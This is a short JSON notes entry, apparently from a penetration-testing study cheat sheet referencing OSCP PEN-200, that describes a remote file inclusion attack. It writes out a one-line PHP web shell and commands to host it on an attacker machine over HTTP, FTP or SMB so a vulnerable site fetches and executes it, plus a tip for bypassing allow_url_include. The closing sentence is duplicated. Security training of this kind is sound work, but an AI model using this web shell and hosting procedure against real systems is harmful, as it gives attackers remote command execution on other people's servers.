      "notes": "Verify RFI first with a local URL: ?language=http://127.0.0.1:80/index.php. Create the shell: echo '<?php system($_GET[\"cmd\"]); ?>' > shell.php. Host it - HTTP: sudo python3 -m http.server <lport>; FTP: sudo python -m pyftpdlib -p 21 (then ftp://<lhost>/shell.php, add user:pass@ if needed); SMB for Windows targets: impacket-smbserver -smb2support share $(pwd) then \\\\<lhost>\\share\\shell.php. SMB is handy when allow_url_include is Off since it is not an HTTP scheme. Also covered in: OSCP PEN-200 Chapter 9 (Common Web Application Attacks). Also covered in: OSCP PEN-200 Chapter 9 (Common Web Application Attacks).",
